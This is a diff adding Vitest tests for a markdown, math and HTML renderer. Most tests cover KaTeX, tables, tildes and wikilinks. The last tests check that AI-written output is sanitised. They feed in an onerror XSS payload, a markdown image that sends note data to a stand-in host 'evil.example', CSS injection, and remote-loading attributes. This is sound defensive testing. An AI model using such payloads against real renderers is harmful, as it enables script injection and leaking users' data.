@@ -1,0 +1,186 @@
+// @vitest-environment jsdom
+import { beforeAll, describe, expect, it } from "vitest";
+import {
+  renderDocumentHtml,
+  renderMarkdownHtml,
+  renderMarkdownInlineHtml,
+} from "./render-html";
+import { loadKatex } from "../math/katex-loader";
+import { writeLocalSettings } from "../../prefs/settings-store";
+
+// The app loads KaTeX on the first formula; these render with it there.
+beforeAll(() => loadKatex());
+
+describe("renderMarkdownHtml", () => {
+  it("renders inline and display math with KaTeX", () => {
+    const html = renderMarkdownHtml("Energy $E=mc^2$.\n\n$$\\frac13$$");
+    expect(html).toContain('class="katex"');
+    expect(html).toContain('class="agent-math"');
+    expect(html).toContain("katex-display");
+  });
+
+  it("takes display math right under a line of text as a formula, not a heading", () => {
+    const html = renderMarkdownHtml(
+      "先给法向量 $v=(1,0)$，求完整受力：\n$$\nMv=\n\\begin{bmatrix}2&1\\\\1&2\\end{bmatrix}\n=\n\\begin{bmatrix}2\\\\1\\end{bmatrix}\n$$\n这对应**线性映射**：输入一个向量。",
+    );
+    expect(html).not.toMatch(/<h\d/);
+    expect(html.match(/katex-display/g)).toHaveLength(1);
+    expect(html).toContain("<strong>线性映射</strong>");
+    expect(html).not.toContain("katex-error");
+  });
+
+  it("renders LaTeX's own delimiters too", () => {
+    expect(renderMarkdownHtml("so \\(x^2\\) holds")).toContain('class="katex"');
+  });
+
+  it("leaves dollar amounts as text", () => {
+    const html = renderMarkdownHtml("costs $5 and $10 today");
+    expect(html).not.toContain("katex");
+    expect(html).toContain("$5 and $10");
+  });
+
+  it("renders GFM tables and task lists", () => {
+    const html = renderMarkdownHtml(
+      "| A | B |\n|---|---|\n| 1 | 2 |\n\n- [x] done",
+    );
+    expect(html).toContain("<table>");
+    expect(html).toContain('type="checkbox"');
+  });
+
+  it("takes stars next to CJK punctuation as bold, as the editor does", () => {
+    const md = "这就是**线性（linearity）**在这里的含义";
+    for (const html of [renderMarkdownHtml(md), renderMarkdownInlineHtml(md)])
+      expect(html).toContain("<strong>线性（linearity）</strong>");
+  });
+
+  it("reads one tilde as the setting says, two as a strikethrough", () => {
+    const md = "40.30~40.45 = **64.0~64.2%**, H~2~O, 5~10人，20~30人, ~~old~~";
+    const all = () => [
+      renderMarkdownHtml(md),
+      renderMarkdownInlineHtml(md),
+      renderDocumentHtml(md),
+    ];
+    try {
+      for (const html of all()) {
+        expect(html).toContain("40.30~40.45 = <strong>64.0~64.2%</strong>");
+        expect(html).toContain("H<sub>2</sub>O");
+        expect(html).toContain("5~10人，20~30人");
+        expect(html).toContain("<del>old</del>");
+      }
+      writeLocalSettings({ singleTilde: "text" });
+      for (const html of all()) {
+        expect(html).toContain("H~2~O");
+        expect(html).not.toContain("<sub>");
+      }
+      writeLocalSettings({ singleTilde: "strikethrough" });
+      for (const html of all())
+        expect(html).toContain("<del>40.45 = **64.0</del>");
+    } finally {
+      writeLocalSettings({ singleTilde: "subscript" });
+    }
+  });
+
+  it("still strips script from model output", () => {
+    expect(renderMarkdownHtml("<img src=x onerror=alert(1)>")).not.toContain(
+      "onerror",
+    );
+  });
+
+  it("renders a $$ block written inside a list item without blank lines", () => {
+    const html = renderMarkdownHtml(
+      "- 法向量由梯度给出：\n  $$\n  \\nabla f=\\left(\\frac{\\partial f}{\\partial x}\\right)\n  $$\n- 下一条",
+    );
+    expect(html).not.toContain("$$");
+    expect(html).toContain("katex-display");
+    expect(html.match(/<li>/g)).toHaveLength(2);
+  });
+
+  it("renders a $$ block that follows a paragraph line directly", () => {
+    const html = renderMarkdownHtml("梯度：\n$$\nx^2\n$$\n结束");
+    expect(html).not.toContain("$$");
+    expect(html).toContain("katex-display");
+  });
+
+  it("draws a wikilink as the editor does, its source in the link colour", () => {
+    expect(renderMarkdownHtml("Daughter of [[Polonius]], sister.")).toBe(
+      '<p>Daughter of <span class="wikilink">[[Polonius]]</span>, sister.</p>\n',
+    );
+    expect(renderMarkdownHtml("[[a_b_c|<b>x</b>]]")).toContain(
+      '<span class="wikilink">[[a_b_c|&lt;b&gt;x&lt;/b&gt;]]</span>',
+    );
+    // `[[x]](url)` is a link whose text has brackets, as elsewhere.
+    expect(renderMarkdownHtml("[[x]](https://a.b)")).not.toContain("wikilink");
+  });
+});
+
+describe("renderDocumentHtml", () => {
+  it("sizes an image by its width, old form or new", () => {
+    expect(
+      renderDocumentHtml('<img src="a.png" alt="图" width="50%">'),
+    ).toContain('width="50%"');
+    const old = renderDocumentHtml('![x](a.png "Cap {textus-width=30%}")');
+    expect(old).toContain('width="30%"');
+    expect(old).toContain('title="Cap"');
+    expect(old).not.toContain("textus-width");
+    expect(renderDocumentHtml("![x](a.png)")).not.toContain("width");
+  });
+
+  it("shows an empty-text link's URL", () => {
+    expect(renderDocumentHtml("see [](https://x.org/a) here")).toContain(
+      '<a href="https://x.org/a">https://x.org/a</a>',
+    );
+    expect(renderDocumentHtml("[text](https://x.org/a)")).toContain(
+      '<a href="https://x.org/a">text</a>',
+    );
+  });
+
+  // The numbers are CSS counters; the preview has to keep the element each
+  // one is drawn on.
+  it("keeps a number slot on every row of gather and align, but not of their starred forms", () => {
+    const slots = (source: string) =>
+      renderDocumentHtml(`$$\n${source}\n$$`).match(/class="eqn-num"/g)
+        ?.length ?? 0;
+    expect(slots("\\begin{gather}a\\\\b\\end{gather}")).toBe(2);
+    expect(slots("\\begin{align}a&=b\\\\c&=d\\end{align}")).toBe(2);
+    expect(slots("\\begin{gather*}a\\\\b\\end{gather*}")).toBe(0);
+    expect(slots("\\begin{align*}a&=b\\\\c&=d\\end{align*}")).toBe(0);
+  });
+
+  it("puts a \\tag label in place of its row's number and drops a \\notag row's", () => {
+    const html = renderDocumentHtml(
+      "$$\n\\begin{align}a&=b\\tag{A}\\\\c&=d\\notag\\\\e&=f\\end{align}\n$$",
+    );
+    expect(html.match(/class="eqn-num"/g)).toHaveLength(1);
+    const doc = new DOMParser().parseFromString(html, "text/html");
+    expect(doc.querySelector(".katex-html .katex-tag")?.textContent).toContain(
+      "(A)",
+    );
+  });
+});
+
+describe("what Textus AI writes", () => {
+  it("loads nothing from the web as it shows, and can't restyle the window", () => {
+    const html = renderMarkdownHtml(
+      '![secret](https://evil.example/?d=notes)\n\n<style>body{display:none}</style>\n\n<span style="background:url(https://evil.example/)">x</span>',
+    );
+    expect(html).not.toContain("<img");
+    expect(html).toContain('href="https://evil.example/?d=notes"');
+    expect(html).not.toContain("<style");
+    expect(html).not.toContain("url(");
+  });
+
+  it("drops every other way a tag loads an address: srcset, poster, background, media", () => {
+    const html = renderMarkdownHtml(
+      [
+        '<img srcset="https://e.x/a?d=1 1x">',
+        '<video poster="https://e.x/p" src="https://e.x/v"></video>',
+        '<audio src="https://e.x/a"></audio>',
+        '<input type="image" src="https://e.x/i">',
+        '<table background="https://e.x/b"><tr><td>x</td></tr></table>',
+        '<picture><source srcset="https://e.x/s"><img alt="a"></picture>',
+      ].join("\n\n"),
+    );
+    expect(html).not.toContain("e.x");
+    expect(renderMarkdownHtml("- [x] done")).toContain('type="checkbox"');
+  });
+});
